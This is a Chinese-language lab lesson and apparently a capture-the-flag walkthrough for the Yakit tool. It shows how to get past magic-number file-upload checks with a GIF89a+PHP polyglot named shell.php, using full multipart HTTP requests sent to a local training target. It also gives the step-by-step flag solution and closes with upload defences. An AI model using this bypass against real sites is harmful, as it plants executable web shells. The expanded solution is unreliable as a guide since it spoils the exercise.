---
title: 文件上传：骗过魔数校验的多态文件
difficulty: practitioner
---

# 文件上传：骗过魔数校验的多态文件

## 原理背景

文件上传漏洞的攻防是层层升级的：查扩展名 → 改后缀就过；查 `Content-Type` → 抓包改头就过；于是有了**魔数校验**——读文件头几个字节判断真实类型（`GIF89a` 开头就是 GIF、`FFD8` 开头就是 JPEG），看似可靠。

但魔数只说明"文件**开头**是图片"，没说"文件**只有**图片"。**GIF + PHP 多态文件**：文件头是合法 GIF 魔数，后面跟着 PHP 代码——检测库读到魔数判定"这是图片"放行，而解析器（配合解析漏洞或路径直达）会执行后面的脚本。

## Yakit 操作步骤

本课练**手工构造 multipart 上传请求**——上传漏洞的测试必须精控每个边界：

1. 打开 Web Fuzzer，构造 multipart 请求骨架：

```http
POST /upload/case/fileheader HTTP/1.1
Host: 127.0.0.1:36870
Content-Type: multipart/form-data; boundary=----Boundary

------Boundary
Content-Disposition: form-data; name="filename"; filename="shell.php"
Content-Type: image/gif

GIF89a
<?php echo 1; ?>
------Boundary--
```

2. 文件内容 = `GIF89a` 魔数 + 换行 + 任意 PHP 代码。可以直接在 Fuzzer 里手打，也可以先用 **Codec** 把"魔数+代码"的组合处理成需要的形态再粘贴；
3. 发送后读响应：上传成功时结果页会给出检测信息（`MITM TYPE` 与 `FileTypeHeaderType` 两项分别是你**声明**的类型和按魔数**检测**出的类型）。

上传页在 `/upload/main?case=fileheader`，表单字段名是 `filename`——从上传页发一次正常上传或 MITM 抓包也能确认这些细节。

## 开始实战

点击 **前往配套题目练习**，启动环境后：先发一个纯 PHP 文件看被拒的响应长什么样，再发 GIF 魔数开头的多态文件——结果页 `FileTypeHeaderType:` 给出 `image/gif` 即代表头检测被绕过。上传成功后读取靶机 flag（`GET /flag`）并提交，完成本题。

<details>
<summary>📋 详细步骤（点击展开，照做即可拿到答案）</summary>

以下以实例地址 `http://127.0.0.1:36870` 为例——**端口每次启动环境都随机分配，请替换成你题目页显示的端口**。

**第 1 步：启动实验环境**

题目详情页点「启动实验环境」，等状态 running，复制访问地址（形如 `http://127.0.0.1:36870`）。

**第 2 步：先传纯 PHP，看被拒的样子**

在 Web Fuzzer 发送（multipart 字段名是 `filename`）：

```http
POST /upload/case/fileheader HTTP/1.1
Host: 127.0.0.1:36870
Content-Type: multipart/form-data; boundary=----Boundary

------Boundary
Content-Disposition: form-data; name="filename"; filename="shell.php"
Content-Type: application/x-php

<?php echo 1; ?>
------Boundary--
```

结果页显示失败原因：

```
upload failed: mime header: application/x-php, filetype actually:
```

按魔数检测不出图片类型，直接拒绝。

**第 3 步：发 GIF 魔数开头的多态文件**

只改两处：文件 part 的 `Content-Type` 改为 `image/gif`，内容前面加上 `GIF89a` 魔数行：

```http
POST /upload/case/fileheader HTTP/1.1
Host: 127.0.0.1:36870
Content-Type: multipart/form-data; boundary=----Boundary

------Boundary
Content-Disposition: form-data; name="filename"; filename="shell.php"
Content-Type: image/gif

GIF89a
<?php echo 1; ?>
------Boundary--
```

注意 boundary 的三条规矩：请求头里声明的 `boundary=----Boundary` 与 body 里每行的 `------Boundary`（多两个横杠）要对应，各 part 之间空一行，结尾一行是 `------Boundary--`。

**第 4 步：读取结果页的检测信息**

上传成功，页面里 `extrainfo` 一行显示：

```
MITM TYPE: image/gif FileTypeHeaderType: image/gif(gif)
```

`MITM TYPE` 是你声明的类型，`FileTypeHeaderType` 是按魔数**检测**出的真实类型——`GIF89a` 开头骗过了检测库，得到 `image/gif`。

**第 4 步：读取本实例 flag**

靶机为本次启动的环境单独生成了唯一 flag（形如 `flag{lab-xxxx}`），存在靶机文件系统的 `/flag.txt`，也可以直接请求靶机根路径的读取端点：

```http
GET /flag HTTP/1.1
Host: 127.0.0.1:36870
```

响应就是 flag 原文（一行，`flag{lab-...}`）。

**第 5 步：提交答案**

回到题目详情页，在答案框输入刚读到的 flag 原文（`flag{lab-...}` 整串）提交。

</details>

## 延伸：上传防御的正确姿势

魔数不是错，错在**只查魔数**。完整防御：白名单扩展名 + 魔数一致性 + 重命名存储（抹掉原始文件名）+ 上传目录剥离执行权限 + 隔离存储域。测试侧，Yakit 插件市场有现成的上传绕过插件（多态文件生成、解析漏洞探测），原理都建立在本课的手工构造之上。

至此四个专题通关——Web Fuzzer、MITM、Codec、fuzztag、反连、插件、扫描，Yakit 的核心武器库你都已上手。回到题库继续刷题巩固，或到 Yaklab 文档挑战更多靶机。
